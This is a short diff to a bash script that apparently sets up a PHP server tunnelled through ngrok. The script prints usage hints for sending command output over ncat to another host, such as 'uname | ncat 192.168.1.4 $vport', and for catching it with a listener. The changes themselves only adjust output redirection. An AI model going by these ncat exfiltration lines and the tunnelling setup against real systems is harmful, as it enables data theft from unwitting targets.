@@ -65,15 +65,15 @@ echo -e "
 \t${IGreen}├──${clear} ${Green}uname | ncat 192.168.1.4 $vport${clear}
 \t${IGreen}└──${clear} ${Green}ncat -lk -p 5576 > savedout${clear}
 "
-pkill php 2>/dev/null
-pkill ngrok 2>/dev/null
+pkill php > /dev/null 2>&1
+pkill ngrok > /dev/null 2>&1
 
-php -S localhost:5555 2>/dev/null
+php -S localhost:5555 > /dev/null 2>&1
 #Starting ngrok
 echo
 echo -e "[${Green}✔${clear}] ${IYellow}GENERATING LINK PLEASE WAIT... ${clear}"
 
-$HOME/ngrok http 2>/dev/null
+$HOME/ngrok http 5555 > /dev/null 2>&1
 sleep 7
 #below lines can be sued for generating direct link.
 ngrok_link=$(curl -s -N http://127.0.0.1:4040/api/tunnels|sed 's#"# #g'|sed 's#http#\nhttp#g'|sed 's#.io#.io\n#g'|grep https|head -n 1)
